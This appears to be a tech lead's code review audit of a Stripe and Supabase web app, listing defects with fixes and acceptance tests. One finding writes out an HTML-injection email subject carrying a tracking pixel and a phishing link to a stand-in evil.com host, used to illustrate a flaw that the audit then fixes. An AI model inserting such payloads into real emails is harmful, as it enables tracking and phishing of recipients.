# S3 Code Review — Post-Sprint Audit

**Reviewer:** Tech Lead / Code Auditor
**Date:** 2026-03-27
**Scope:** All files added or modified in Sprint 3 commit (`[s3]`), plus carryover from S1/S2 reviews
**Verdict:** The Stripe integration follows the right patterns — webhook signature verification, correct 200/500 error split for retryability, lazy customer creation with a race guard, and atomic Lua scripting for save limits. The tier enforcement logic is clean and well-tested at the shared layer. However, there are several issues that range from a DB write that silently never executes, to a missing UNIQUE constraint that the ticket explicitly called for, to HTML injection in notification emails, to duplicated infrastructure scattered across 5+ files. The pricing page CTA logic also has a correctness gap for paid-to-paid tier transitions.

---

## Severity Legend

| Level | Meaning |
|-------|---------|
| **P0 — Critical** | Will cause data loss, silent failures, or runtime crashes in production. Fix immediately. |
| **P1 — High** | Incorrect behavior or significant performance/security issue. Fix before launch. |
| **P2 — Medium** | Best-practice violation or latent bug. Fix this sprint or next. |
| **P3 — Low** | Cleanup / DX improvement. Schedule when convenient. |

---

## S3-R001 · P0 · `usage_log` fire-and-forget write never executes — dead code

**What's wrong:**
In `/api/ingest/route.ts` lines 289-293:
```ts
if (user.tier === 'free') {
  const month = getCurrentMonth()
  void supabase
    .from('usage_log')
    .insert({ user_id: user.id, action_type: 'save', month })
}
```

Supabase JS v2's query builder is **lazy** — it implements `PromiseLike` and the HTTP request is only initiated inside the `.then()` method. Calling `.insert(...)` constructs the builder object but does not send the request. The `void` operator evaluates the expression (creating the builder) and discards the return value, but crucially **never calls `.then()`**, so the fetch never fires.

The `usage_log` table is always empty. Admin reporting (planned for S5) has no data to report on.

The same pattern exists in `apps/web/app/auth/callback/route.ts` line 27 (`void supabase.from('users').update({ welcome_email_sent: true })`) — the `welcome_email_sent` flag is never set, meaning the S2-R006 fix for duplicate welcome emails is also broken.

**File:** `apps/web/app/api/ingest/route.ts`, `apps/web/app/auth/callback/route.ts`

**Actionable steps:**
1. Append `.then()` to trigger execution, with optional error logging:
   ```ts
   supabase
     .from('usage_log')
     .insert({ user_id: user.id, action_type: 'save', month })
     .then(({ error }) => {
       if (error) console.error('[ingest] usage_log write failed:', error.message)
     })
   ```
2. Apply the same fix to the `welcome_email_sent` update in `auth/callback/route.ts`.
3. Add a test or monitoring check that verifies `usage_log` rows appear after a successful ingest.

**Acceptance:**
- After a successful ingest by a free-tier user, a row appears in `usage_log` with the correct `user_id`, `action_type`, and `month`.
- After a new user's first sign-in, `users.welcome_email_sent` is set to `true`.

---

## S3-R002 · P0 · Missing UNIQUE constraint on `users.stripe_customer_id`

**What's wrong:**
The S302 ticket explicitly requires:
```sql
ALTER TABLE public.users ADD CONSTRAINT users_stripe_customer_id_unique UNIQUE (stripe_customer_id);
```

No migration was created. The `stripe_customer_id` column (defined in `20240001000000_initial_schema.sql` line 9) is a plain `text` with no uniqueness constraint.

The code in `stripe-customer.ts` uses an atomic conditional UPDATE (`WHERE stripe_customer_id IS NULL`) as a concurrency gate. This works at the application level, but without a DB-level UNIQUE constraint:
- There is no database-enforced guarantee against duplicate assignments.
- If any other code path (admin tool, migration script, manual SQL) sets `stripe_customer_id`, duplicates can silently exist.
- Stripe uses `stripe_customer_id` to route webhook events — duplicate values could cause one user's tier to change when another user's subscription updates.

**File:** Missing migration file

**Actionable steps:**
1. Create `supabase/migrations/<timestamp>_add_stripe_customer_id_unique.sql`:
   ```sql
   ALTER TABLE public.users
     ADD CONSTRAINT users_stripe_customer_id_unique UNIQUE (stripe_customer_id);
   ```
2. Apply: `npx supabase db push --linked`
3. Run `pnpm gen:types` to regenerate types.
4. Verify in Supabase Studio that the constraint exists.

**Acceptance:**
- `\d public.users` in `psql` shows a UNIQUE constraint on `stripe_customer_id`.
- Attempting `UPDATE public.users SET stripe_customer_id = 'cus_existing' WHERE id = 'other-user'` fails with a unique violation.

---

## S3-R003 · P0 · HTML injection in cap-exceeded notification email via `emailSubject`

**What's wrong:**
In `apps/web/lib/emails/cap-exceeded.ts` line 48:
```ts
html: `
  <p>The email you tried to send (<em>${emailSubject || '(no subject)'}</em>) was not saved.</p>
`
```

The `emailSubject` comes directly from the inbound email's `Subject` header — attacker-controlled input. It is interpolated raw into an HTML string. A malicious sender could craft a subject like:
```
<img src="https://evil.com/track?u=${userId}">Click <a href="https://evil.com/phish">here</a> to recover
```

Most email clients strip `<script>` tags, but many render `<img>`, `<a>`, and CSS — enabling phishing links, tracking pixels, and visual spoofing inside a legitimate drop-note notification email.

**File:** `apps/web/lib/emails/cap-exceeded.ts`

**Actionable steps:**
1. Create a shared HTML escape utility in `packages/shared/src/html.ts`:
   ```ts
   export function escapeHtml(str: string): string {
     return str
       .replace(/&/g, '&amp;')
       .replace(/</g, '&lt;')
       .replace(/>/g, '&gt;')
       .replace(/"/g, '&quot;')
       .replace(/'/g, '&#39;')
   }
   ```
2. Use it when interpolating user-controlled content:
   ```ts
   <p>The email you tried to send (<em>${escapeHtml(emailSubject || '(no subject)')}</em>) was not saved.</p>
   ```
3. Audit all other email templates for the same pattern.

**Acceptance:**
- An email with subject `<script>alert(1)</script>` results in the literal text `<script>alert(1)</script>` appearing in the notification email, not rendered HTML.
- `escapeHtml` is exported from `@drop-note/shared` with unit tests.

---

## S3-R004 · P1 · Checkout and portal routes have zero error handling around external API calls

**What's wrong:**
In `apps/web/app/api/stripe/checkout/route.ts`, two external calls can throw:
- Line 36: `getOrCreateStripeCustomer(user.id)` — calls Stripe API + Supabase
- Line 38: `stripe.checkout.sessions.create(...)` — calls Stripe API

Neither is wrapped in try-catch. If Stripe is down or the user doesn't exist in the DB, the function throws an unhandled exception → Next.js returns a generic 500 HTML error page → the client's `res.json()` call throws → the user sees "Something went wrong."

Same pattern in `apps/web/app/api/stripe/portal/route.ts`:
- Line 35: `stripe.billingPortal.sessions.create(...)` — no error handling

The webhook route (`route.ts` line 45-123) correctly wraps everything in try-catch. The checkout/portal routes should follow the same pattern.

**Files:** `apps/web/app/api/stripe/checkout/route.ts`, `apps/web/app/api/stripe/portal/route.ts`

**Actionable steps:**
1. Wrap the Stripe calls in try-catch and return structured JSON errors:
   ```ts
   try {
     const stripeCustomerId = await getOrCreateStripeCustomer(user.id)
     const session = await stripe.checkout.sessions.create({ ... })
     return NextResponse.json({ url: session.url })
   } catch (err) {
     console.error('[checkout] Stripe error:', err instanceof Error ? err.message : err)
     return NextResponse.json(
       { error: 'Failed to create checkout session. Please try again.' },
       { status: 502 }
     )
   }
   ```
2. Apply the same pattern to the portal route.
3. The client already handles non-200 responses — it will display the error message.

**Acceptance:**
- If Stripe is unreachable, the checkout route returns `502` with a JSON error, not a 500 HTML page.
- The user sees "Failed to create checkout session. Please try again." in the UI.

---

## S3-R005 · P1 · Pricing page CTA logic incorrectly routes paid-to-paid upgrades through portal

**What's wrong:**
In `apps/web/app/pricing/page.tsx` lines 123-125:
```tsx
) : userTier && (userTier === 'pro' || userTier === 'power') ? (
  // Paid user switching plans — use portal
  <ManageSubscriptionButton />
)
```

This shows `ManageSubscriptionButton` (→ Stripe Customer Portal) for **all** paid users on **all** non-current paid tier cards. A Pro user looking at the Power card sees "Manage subscription" instead of "Upgrade to Power."

The S311 ticket specifies:
- "If user is on a **lower** tier: button calls `POST /api/stripe/checkout`"
- "If user is on a **higher** tier: show 'Manage subscription' → calls `POST /api/stripe/portal`"

**However**, this ticket spec itself has a flaw: creating a new Stripe Checkout session for a user who already has an active subscription would create a **second subscription**, not upgrade the existing one. Plan changes for existing subscribers should go through either the Customer Portal or the Subscriptions API (`stripe.subscriptions.update()`).

The current implementation (always portal for paid users) is **functionally safe** but creates a poor UX: the user is dumped into a generic portal instead of a streamlined upgrade flow.

**Files:** `apps/web/app/pricing/page.tsx`

**Actionable steps:**
1. For paid-to-higher-tier transitions (e.g., Pro → Power), create a new API route `POST /api/stripe/subscription/upgrade` that uses `stripe.subscriptions.update()` with the new price and `proration_behavior: 'create_prorations'`. This avoids duplicate subscriptions.
2. Alternatively, keep the portal approach but differentiate the CTA label:
   ```tsx
   const tierRank = { free: 0, pro: 1, power: 2 }
   const isUpgrade = tierRank[userTier] < tierRank[tierName.toLowerCase()]
   // Show "Upgrade to Power" or "Manage subscription" accordingly
   ```
   Even if both route to the portal, the label should indicate intent.
3. At minimum, fix the UX by showing "Upgrade to {tier}" for lower-to-higher and "Manage subscription" for higher-to-lower.

**Acceptance:**
- A Pro user sees "Upgrade to Power" on the Power card (not "Manage subscription").
- A Power user sees "Manage subscription" on the Pro card.
- No duplicate subscriptions are created.

---

## S3-R006 · P1 · `checkout.session.completed` doesn't verify target user exists — orphaned payments

**What's wrong:**
In the webhook handler (`apps/web/app/api/webhooks/stripe/route.ts` lines 47-73), the `checkout.session.completed` handler:
1. Gets `userId` from `session.client_reference_id`
2. Calls `updateUserTier(userId, tier)`
3. `updateUserTier` runs `UPDATE public.users SET tier = $tier WHERE id = $userId`

If the user was deleted between checkout creation and completion (e.g., they signed up, started checkout, then deleted their account), the UPDATE matches 0 rows. `supabaseAdmin.from('users').update(...).eq('id', userId)` returns `{ error: null, count: 0 }` — no error is thrown.

The webhook returns `200`, Stripe marks the event as delivered, and the payment is orphaned. The user paid but has no account. No alert, no log, no refund trigger.

**File:** `apps/web/app/api/webhooks/stripe/route.ts`

**Actionable steps:**
1. After the tier update, verify the update actually matched a row:
   ```ts
   async function updateUserTier(userId: string, tier: 'free' | 'pro' | 'power') {
     const { error, count } = await supabaseAdmin
       .from('users')
       .update({ tier })
       .eq('id', userId)
       .select('id', { count: 'exact', head: true })

     if (error) {
       throw new Error(`[webhook] DB error updating tier for ${userId}: ${error.message}`)
     }
     if (count === 0) {
       throw new Error(`[webhook] User ${userId} not found — tier update matched 0 rows`)
     }
   }
   ```
2. The `throw` causes a `500` response, so Stripe retries — which gives time to investigate.
3. Add an alert/log for this case so orphaned payments are caught.

**Acceptance:**
- If `updateUserTier` targets a non-existent user, the webhook returns `500` and the error is logged.
- Stripe retries the event, allowing manual investigation.

---

## S3-R007 · P1 · Webhook tests don't verify DB update arguments

**What's wrong:**
The webhook tests in `apps/web/app/api/webhooks/stripe/__tests__/webhook.test.ts` mock the Supabase chain but never assert what arguments were passed. For example, the `checkout.session.completed` test (lines 93-112) only checks:
```ts
expect(res.status).toBe(200)
expect(body.received).toBe(true)
```

It doesn't verify:
- `mockFrom` was called with `'users'`
- `update` was called with `{ tier: 'pro' }`
- `eq` was called with `'id'` and `'user-123'`

For a payment-critical code path where incorrect tier assignment means a free user gets paid features or a paying user loses access, the tests should assert the exact DB mutation.

**File:** `apps/web/app/api/webhooks/stripe/__tests__/webhook.test.ts`

**Actionable steps:**
1. Assert the full Supabase call chain in each test:
   ```ts
   it('handles checkout.session.completed and updates tier to pro', async () => {
     // ... existing setup ...
     const res = await POST(makeRequest('{}'))
     expect(res.status).toBe(200)
     expect(mockFrom).toHaveBeenCalledWith('users')
     const updateFn = mockFrom.mock.results[0].value.update
     expect(updateFn).toHaveBeenCalledWith({ tier: 'pro' })
     const eqFn = updateFn.mock.results[0].value.eq
     expect(eqFn).toHaveBeenCalledWith('id', 'user-123')
   })
   ```
2. Add a test for `subscription.deleted` that asserts `{ tier: 'free' }` is passed.
3. Add a test verifying `subscription.updated` with unknown price ID does NOT call `update`.

**Acceptance:**
- Every webhook event test asserts the exact table, column values, and filter conditions passed to Supabase.
- Test for "unknown price skip" asserts `mockFrom` was NOT called.

---

## S3-R008 · P1 · Cap-exceeded email says "free plan" regardless of actual tier

**What's wrong:**
In `apps/web/lib/emails/cap-exceeded.ts` line 47:
```ts
html: `
  <p>Your free plan stores up to <strong>${tierLimit} items</strong>.</p>
`
```

The text hardcodes "Your free plan" but `tierLimit` is passed as a parameter and could be `100` (Pro) or `500` (Power). A Pro user with 100 items who hits the cap receives an email saying "Your **free plan** stores up to **100 items**" — confusing and incorrect.

Similarly, in `save-limit-exceeded.ts` line 42:
```ts
<p>You've used all 30 save actions for this month on the free plan.</p>
```
The number `30` is hardcoded rather than using `SAVE_ACTIONS_FREE_LIMIT`. While the save limit only applies to free users today, hardcoding makes the value easy to forget when updating the constant.

**Files:** `apps/web/lib/emails/cap-exceeded.ts`, `apps/web/lib/emails/save-limit-exceeded.ts`

**Actionable steps:**
1. Pass `tier` as a parameter and use it in the message:
   ```ts
   <p>Your <strong>${tier}</strong> plan stores up to <strong>${tierLimit} items</strong>.</p>
   ```
2. In `save-limit-exceeded.ts`, import and use the constant:
   ```ts
   import { SAVE_ACTIONS_FREE_LIMIT } from '@drop-note/shared'
   // ...
   <p>You've used all ${SAVE_ACTIONS_FREE_LIMIT} save actions for this month on the free plan.</p>
   ```

**Acceptance:**
- A Pro user hitting the cap receives an email saying "Your **pro** plan stores up to **100 items**."
- The save-limit email references the shared constant, not a magic number.

---

## S3-R009 · P2 · 5+ duplicate `supabaseAdmin` instances — no shared admin client module

**What's wrong:**
The following files each create an identical module-level `supabaseAdmin` with the same config:
1. `apps/web/app/api/webhooks/stripe/route.ts` (lines 7-11)
2. `apps/web/app/api/stripe/portal/route.ts` (lines 7-11)
3. `apps/web/app/api/admin/users/[userId]/tier/route.ts` (lines 6-10)
4. `apps/web/app/(dashboard)/layout.tsx` (lines 9-13)
5. `apps/web/lib/stripe-customer.ts` (lines 5-9)
6. `apps/web/app/api/ingest/route.ts` (lines 42-46)

Six copies of:
```ts
const supabaseAdmin = createClient<Database>(
  process.env.NEXT_PUBLIC_SUPABASE_URL!,
  process.env.SUPABASE_SERVICE_ROLE_KEY!,
  { auth: { persistSession: false } }
)
```

This violates DRY and means any change (e.g., adding `db` schema option, switching to `requireEnv()`) must be made in 6 places. One of these (the portal route) even imports `createClient` under an alias to avoid collision with the SSR client:
```ts
import { createClient as createServerClient } from '@supabase/supabase-js'
```

**Files:** Six files listed above

**Actionable steps:**
1. Create `apps/web/lib/supabase/admin.ts`:
   ```ts
   import { createClient } from '@supabase/supabase-js'
   import { requireEnv } from '@drop-note/shared'
   import type { Database } from '@drop-note/shared'

   export const supabaseAdmin = createClient<Database>(
     requireEnv('NEXT_PUBLIC_SUPABASE_URL'),
     requireEnv('SUPABASE_SERVICE_ROLE_KEY'),
     { auth: { persistSession: false } }
   )
   ```
2. Replace all 6 inline instances with `import { supabaseAdmin } from '@/lib/supabase/admin'` (or relative path for non-aliased files).
3. This also fixes the `process.env.X!` non-null assertion issue for these two vars.

**Acceptance:**
- A single `supabaseAdmin` instance defined in `lib/supabase/admin.ts`.
- All 6 consumer files import from that module.
- `requireEnv` is used instead of `!` assertions.

---

## S3-R010 · P2 · `process.env.X!` non-null assertions used everywhere — `requireEnv()` largely ignored

**What's wrong:**
The S2-R015 ticket created `packages/shared/src/env.ts` with `requireEnv()` specifically to replace `process.env.X!` patterns. Sprint 3 added it in exactly **one** place — `apps/web/lib/stripe.ts`. Every other new S3 file uses `process.env.X!`:

| File | Count of `!` assertions |
|------|------------------------|
| `stripe-customer.ts` | 2 |
| `portal/route.ts` | 2 |
| `webhooks/stripe/route.ts` | 3 |
| `admin/.../tier/route.ts` | 2 |
| `ingest/route.ts` (S3 additions) | 4 |
| `cap-exceeded.ts` | 3 |
| `save-limit-exceeded.ts` | 3 |
| `(dashboard)/layout.tsx` | 2 |

**Total: 21 `!` assertions that should be `requireEnv()` calls.**

If any of these vars are missing, the error will be a cryptic `Invalid URL: undefined` or `Cannot read property of undefined` deep inside a library — not the clear `Missing required environment variable: X` message.

**Files:** All S3-modified files listed above

**Actionable steps:**
1. Replace all `process.env.X!` patterns with `requireEnv('X')` calls.
2. This is largely addressed by S3-R009 (shared admin client), which eliminates 12 of the 21 instances.
3. For the remaining 9 (Redis URLs, Resend API key, webhook secret), apply `requireEnv` directly.

**Acceptance:**
- Zero `process.env.X!` assertions in S3-modified files.
- Starting the app with a missing `STRIPE_WEBHOOK_SECRET` prints `Missing required environment variable: STRIPE_WEBHOOK_SECRET` immediately.

---

## S3-R011 · P2 · Duplicated `getResend()` and `getRedis()` factories in email modules

**What's wrong:**
`apps/web/lib/emails/cap-exceeded.ts` and `apps/web/lib/emails/save-limit-exceeded.ts` both contain identical factory functions:

```ts
function getResend() {
  return new Resend(process.env.RESEND_API_KEY!)
}

function getRedis() {
  return new Redis({
    url: process.env.UPSTASH_REDIS_REST_URL!,
    token: process.env.UPSTASH_REDIS_REST_TOKEN!,
  })
}
```

Two copies of each, both using `!` assertions. If a third email type is added (e.g., usage report), it'll be copy-pasted again.

**Files:** `apps/web/lib/emails/cap-exceeded.ts`, `apps/web/lib/emails/save-limit-exceeded.ts`

**Actionable steps:**
1. Create `apps/web/lib/emails/shared.ts`:
   ```ts
   import { Resend } from 'resend'
   import { Redis } from '@upstash/redis'
   import { requireEnv } from '@drop-note/shared'

   let _resend: Resend | null = null
   export function getResend(): Resend {
     if (!_resend) _resend = new Resend(requireEnv('RESEND_API_KEY'))
     return _resend
   }

   let _redis: Redis | null = null
   export function getRedis(): Redis {
     if (!_redis) _redis = new Redis({
       url: requireEnv('UPSTASH_REDIS_REST_URL'),
       token: requireEnv('UPSTASH_REDIS_REST_TOKEN'),
     })
     return _redis
   }
   ```
2. Import from `./shared` in both email modules.
3. The singleton pattern also avoids creating new instances on every call.

**Acceptance:**
- `getResend()` and `getRedis()` defined in one place with `requireEnv`.
- Both email modules import from the shared file.

---

## S3-R012 · P2 · Admin tier override doesn't verify target user exists

**What's wrong:**
In `apps/web/app/api/admin/users/[userId]/tier/route.ts` lines 54-57:
```ts
const { error } = await supabaseAdmin
  .from('users')
  .update({ tier })
  .eq('id', userId)
```

If `userId` is a valid UUID but doesn't match any user (typo, deleted user), the UPDATE matches 0 rows. Supabase returns `{ error: null }` — the response is `{ ok: true, userId, tier }`, misleading the admin into thinking the update succeeded.

**File:** `apps/web/app/api/admin/users/[userId]/tier/route.ts`

**Actionable steps:**
1. Add `.select()` to get the updated row and check if it exists:
   ```ts
   const { data, error } = await supabaseAdmin
     .from('users')
     .update({ tier })
     .eq('id', userId)
     .select('id, tier')
     .maybeSingle()

   if (error) { ... }
   if (!data) {
     return NextResponse.json({ error: 'User not found' }, { status: 404 })
   }
   return NextResponse.json({ ok: true, userId: data.id, tier: data.tier })
   ```

**Acceptance:**
- `PATCH /api/admin/users/{nonexistent-uuid}/tier` returns `404 { error: "User not found" }`.
- `PATCH /api/admin/users/{valid-uuid}/tier` still returns `{ ok: true }`.

---

## S3-R013 · P2 · `ALLOWED_MIME` types defined inline in ingest route — not shared with worker

**What's wrong:**
In `apps/web/app/api/ingest/route.ts` lines 81-83:
```ts
const ALLOWED_MIME = new Set([
  'image/jpeg', 'image/png', 'image/gif', 'image/webp', 'application/pdf',
])
```

The worker (`apps/worker/src/processors/email.ts`) must also decide which attachments to process. If the allowed types diverge between the ingest route (for counting) and the worker (for processing), the count will be wrong — the ingest route might count an attachment that the worker skips, or vice versa.

Additionally, the set is recreated on every `countIncomingItems` call (it's inside the function). Since the function is called once per ingest request, this isn't a performance concern, but it should be a module-level constant.

**Files:** `apps/web/app/api/ingest/route.ts`, `packages/shared/src/tier.ts` (recommended location)

**Actionable steps:**
1. Move to `packages/shared/src/tier.ts` (or a new `packages/shared/src/mime.ts`):
   ```ts
   export const ALLOWED_ATTACHMENT_MIMES = new Set([
     'image/jpeg', 'image/png', 'image/gif', 'image/webp', 'application/pdf',
   ])

   export function isAllowedMimeType(mimeType: string): boolean {
     return mimeType.startsWith('text/') || ALLOWED_ATTACHMENT_MIMES.has(mimeType)
   }
   ```
2. Import in both the ingest route and the worker.

**Acceptance:**
- `ALLOWED_ATTACHMENT_MIMES` is exported from `@drop-note/shared`.
- Both ingest route and worker use the same constant for MIME filtering.

---

## S3-R014 · P2 · Inconsistent error handling patterns across S3 routes

**What's wrong:**
Sprint 3 added 5 API routes with 4 different error handling approaches:

| Route | Pattern | Unhandled throws? |
|-------|---------|-------------------|
| `/api/webhooks/stripe` | Full try-catch with 200/500 split | No |
| `/api/ingest` | Global try-catch, always 200 | No |
| `/api/stripe/checkout` | No try-catch | **Yes** |
| `/api/stripe/portal` | No try-catch | **Yes** |
| `/api/admin/users/.../tier` | Per-call error check, no try-catch | **Yes** |

The checkout and portal routes can throw unhandled exceptions from Stripe API calls (covered in S3-R004). The admin route can throw if `request.json()` is called on an already-consumed body or if the Supabase admin client is misconfigured.

**Files:** All 5 route files

**Actionable steps:**
1. Adopt a consistent pattern: wrap the route body in try-catch and return structured errors.
2. Consider a shared wrapper function:
   ```ts
   export function withErrorHandler(handler: (req: Request) => Promise<Response>) {
     return async (req: Request) => {
       try {
         return await handler(req)
       } catch (err) {
         console.error('[api] Unhandled error:', err)
         return NextResponse.json(
           { error: 'Internal server error' },
           { status: 500 }
         )
       }
     }
   }
   ```
3. Apply to all non-webhook routes (the webhook route has its own specialized error handling).

**Acceptance:**
- No route can throw an unhandled exception to the Next.js error boundary.
- All error responses are JSON, not HTML.

---

## S3-R015 · P2 · `VALID_PRICE_IDS` set in checkout route may contain `undefined`

**What's wrong:**
In `apps/web/app/api/stripe/checkout/route.ts` lines 6-9:
```ts
const VALID_PRICE_IDS = new Set([
  process.env.STRIPE_PRO_PRICE_ID,
  process.env.STRIPE_POWER_PRICE_ID,
])
```

If either env var is undefined, the Set contains `undefined`. Then `VALID_PRICE_IDS.has(priceId)` where `priceId` is a string would never match `undefined`, so this doesn't create a false-positive. However, the Set's `.size` is 2 (or 1 if both are the same undefined) when it should logically be 0.

The real problem: if **both** env vars are missing, `VALID_PRICE_IDS` contains `Set { undefined, undefined }` = `Set { undefined }`. The validation `!priceId || !VALID_PRICE_IDS.has(priceId)` correctly rejects all requests (no string matches `undefined`), but the error message "Invalid price" doesn't tell the developer the env vars are missing. The route silently rejects all upgrades.

**File:** `apps/web/app/api/stripe/checkout/route.ts`

**Actionable steps:**
1. Use `requireEnv` and filter out falsy values:
   ```ts
   const VALID_PRICE_IDS = new Set([
     requireEnv('STRIPE_PRO_PRICE_ID'),
     requireEnv('STRIPE_POWER_PRICE_ID'),
   ])
   ```
   This fails fast at module load if the vars are missing.

**Acceptance:**
- Starting the app without `STRIPE_PRO_PRICE_ID` throws immediately, not silently when a user tries to upgrade.

---

## S3-R016 · P2 · Dashboard layout uses `supabaseAdmin` (service_role) for item count — bypasses RLS

**What's wrong:**
In `apps/web/app/(dashboard)/layout.tsx` lines 25-31:
```ts
const [{ data: userData }, { count: itemCount }] = await Promise.all([
  supabaseAdmin.from('users').select('tier').eq('id', user.id).single(),
  supabaseAdmin.from('items').select('*', { count: 'exact', head: true })
    .eq('user_id', user.id)
    .is('deleted_at', null),
])
```

The layout already has the authenticated `supabase` client (line 16) which would enforce RLS policies. Using `supabaseAdmin` bypasses RLS — if there's ever a bug in the `.eq('user_id', user.id)` filter (e.g., someone removes it during refactoring), the admin client would return all users' items.

The `tier` query on `users` needs admin client (users can only read their own row via RLS, and the user row query might be filtered differently). But the `items` count query should work fine with the authenticated client since RLS allows `user_id = auth.uid()`.

**File:** `apps/web/app/(dashboard)/layout.tsx`

**Actionable steps:**
1. Use the authenticated `supabase` client for the items count:
   ```ts
   const [{ data: userData }, { count: itemCount }] = await Promise.all([
     supabaseAdmin.from('users').select('tier').eq('id', user.id).single(),
     supabase.from('items').select('*', { count: 'exact', head: true })
       .is('deleted_at', null),
     // RLS enforces user_id = auth.uid(), no need for .eq('user_id', ...)
   ])
   ```
2. Keep `supabaseAdmin` only for queries that truly need to bypass RLS (e.g., the `users.tier` query if RLS doesn't expose `tier`).

**Acceptance:**
- The items count query uses the authenticated client with RLS enforcement.
- Removing `.eq('user_id', ...)` still returns only the current user's items (RLS safety net).

---

## S3-R017 · P2 · No Redis error handling around Lua `eval` for save action limit

**What's wrong:**
In `apps/web/app/api/ingest/route.ts` lines 230-234:
```ts
const newTotal = await redis.eval(
  ATOMIC_SAVE_INCR_SCRIPT,
  [saveKey],
  [incomingCount, SAVE_ACTIONS_FREE_LIMIT, TTL_35_DAYS],
) as number
```

If Redis is temporarily unreachable or the Upstash REST call fails, `redis.eval()` throws. This is caught by the global try-catch (line 297) which returns `{ ok: true }` — meaning the email is **silently discarded** without the user knowing.

Unlike the item cap check (which fails open and the email is at least logged as rejected), a Redis failure here means a free user's email vanishes with no notification, no error email, and no retry.

**File:** `apps/web/app/api/ingest/route.ts`

**Actionable steps:**
1. Wrap the Lua eval in its own try-catch and fail open (allow the email through):
   ```ts
   let saveCheckPassed = true
   try {
     const newTotal = await redis.eval(...) as number
     if (newTotal === -1) {
       saveCheckPassed = false
       // Send notification...
     }
   } catch (err) {
     console.error('[ingest] Redis save-limit check failed — allowing email through:', err)
     // Fail open: better to allow one extra email than silently discard it
   }
   if (!saveCheckPassed) return NextResponse.json({ ok: true }, { status: 200 })
   ```
2. Add monitoring/alerting for this error case.

**Acceptance:**
- Redis being temporarily down doesn't cause free-tier emails to be silently discarded.
- An error log clearly indicates the save-limit check was skipped.

---

## S3-R018 · P3 · `TIER_ATTACHMENT_SIZE_MB` naming inconsistent with ticket spec

**What's wrong:**
The S306 ticket defines:
```ts
export const TIER_ATTACHMENT_SIZE_LIMITS = { free: 10, pro: 25, power: 50 } as const
```

The implementation uses:
```ts
export const TIER_ATTACHMENT_SIZE_MB = { free: 10, pro: 25, power: 50 } as const
```

`TIER_ATTACHMENT_SIZE_MB` is arguably a better name (it includes the unit), but it diverges from the ticket spec, making it harder to trace code back to tickets. The S306 acceptance criteria (#7) says: "TIER_ATTACHMENT_SIZE_LIMITS is importable from @drop-note/shared" — this technically fails.

**File:** `packages/shared/src/tier.ts`

**Actionable steps:**
1. Either rename to `TIER_ATTACHMENT_SIZE_LIMITS` for ticket consistency, or update the ticket to reflect the actual name.
2. If renaming, add a deprecation alias: `export const TIER_ATTACHMENT_SIZE_LIMITS = TIER_ATTACHMENT_SIZE_MB`.

**Acceptance:**
- Ticket spec and code use the same constant name.

---

## S3-R019 · P3 · `UpgradeButton` and `ManageSubscriptionButton` have duplicated structure

**What's wrong:**
`UpgradeButton.tsx` and `ManageSubscriptionButton.tsx` share ~80% of their structure:
- Both manage `loading` and `error` state
- Both call `fetch()` → check `res.ok` → parse JSON → redirect to `url`
- Both render a button with loading/error states
- Both have identical error handling patterns

The only differences: the URL, method, body, and button label.

**Files:** `apps/web/components/UpgradeButton.tsx`, `apps/web/components/ManageSubscriptionButton.tsx`

**Actionable steps:**
1. Extract a shared `StripeActionButton` component:
   ```tsx
   interface StripeActionButtonProps {
     endpoint: string
     body?: Record<string, unknown>
     label: string
     loadingLabel?: string
     variant?: 'default' | 'outline'
     className?: string
   }
   ```
2. Both `UpgradeButton` and `ManageSubscriptionButton` become thin wrappers (or are replaced entirely).

**Acceptance:**
- Shared button component with configurable endpoint, body, and label.
- No duplicated fetch/error/loading logic.

---

## S3-R020 · P3 · `priceIdToTier` reads env vars on every call — no caching

**What's wrong:**
In `packages/shared/src/stripe-helpers.ts`:
```ts
export function priceIdToTier(priceId: string): 'pro' | 'power' | null {
  if (!priceId) return null
  if (priceId === process.env.STRIPE_PRO_PRICE_ID) return 'pro'
  if (priceId === process.env.STRIPE_POWER_PRICE_ID) return 'power'
  return null
}
```

This reads `process.env` on every call. While `process.env` access is fast in Node.js (it's an object lookup), this makes the function impure and harder to test without mocking `process.env` globally (as the tests currently do with `beforeEach`/`afterEach`).

**File:** `packages/shared/src/stripe-helpers.ts`

**Actionable steps:**
1. Accept price IDs as parameters with env var defaults:
   ```ts
   export function priceIdToTier(
     priceId: string,
     proPriceId: string = process.env.STRIPE_PRO_PRICE_ID ?? '',
     powerPriceId: string = process.env.STRIPE_POWER_PRICE_ID ?? '',
   ): 'pro' | 'power' | null {
     if (!priceId) return null
     if (priceId === proPriceId) return 'pro'
     if (priceId === powerPriceId) return 'power'
     return null
   }
   ```
2. This makes tests cleaner (pass IDs directly) and keeps the env var fallback for production callers.

**Acceptance:**
- `priceIdToTier('price_pro', 'price_pro', 'price_power')` returns `'pro'` without env vars.
- Existing callers without extra args still work via defaults.
- Tests no longer need `process.env` manipulation.

---

## Carryover from Previous Reviews (Not Addressed in S3)

| Ticket | Issue | Originally Flagged | Status |
|--------|-------|-------------------|--------|
| S1-R013 | `block_list.type` uses CHECK instead of ENUM | S1 review | Still open |
| S1-R017 | Middleware calls `getUser()` on public pages | S1 review | Still open |
| S2-R006 | Welcome email "first sign-in" detection (fragile 30-second window) | S2 review | Flag was set, but never persisted (see S3-R001) |
| S2-R015 | No env var validation on startup | S2 review | Partially fixed — only `stripe.ts` uses `requireEnv()` |
| S2-R019 | `openai.ts` hardcodes model name | S2 review | Still open |

---

## Summary by Priority

| Priority | Count | Tickets |
|----------|-------|---------|
| P0 — Critical | 3 | S3-R001, S3-R002, S3-R003 |
| P1 — High | 5 | S3-R004, S3-R005, S3-R006, S3-R007, S3-R008 |
| P2 — Medium | 9 | S3-R009 – S3-R017 |
| P3 — Low | 3 | S3-R018, S3-R019, S3-R020 |
| Carryover | 5 | S1-R013, S1-R017, S2-R006, S2-R015, S2-R019 |
| **Total** | **25** | |

### Recommended execution order

1. **Immediate hotfix** (before any real Stripe payment): S3-R001 (dead usage_log write), S3-R002 (missing UNIQUE constraint), S3-R003 (HTML injection)
2. **This week** (before launch): S3-R004, S3-R006, S3-R007, S3-R008
3. **Sprint 4 alongside feature work**: S3-R005 (CTA logic), S3-R009 through S3-R017
4. **Backlog**: S3-R018, S3-R019, S3-R020, plus carryover items
